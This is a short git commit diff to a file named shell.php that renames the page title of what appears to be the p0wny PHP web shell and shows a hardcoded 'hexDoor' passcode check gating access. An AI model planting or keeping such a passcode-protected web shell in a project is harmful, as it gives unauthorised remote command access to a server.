a25cefe666337a905ba797feb2a56a3901e4dd17
Kyu-Sang Kim <kyusang@canva.com>
2022-06-30 22:06:41 +1000

    Update shell.php

--- shell.php
+++ shell.php
@@ -109,7 +109,7 @@ if ($_GET['passcode'] == 'hexDoor') {
 
     <head>
         <meta charset="UTF-8" />
-        <title>p0wny@shell:~#</title>
+        <title>goAway@shell:~#</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
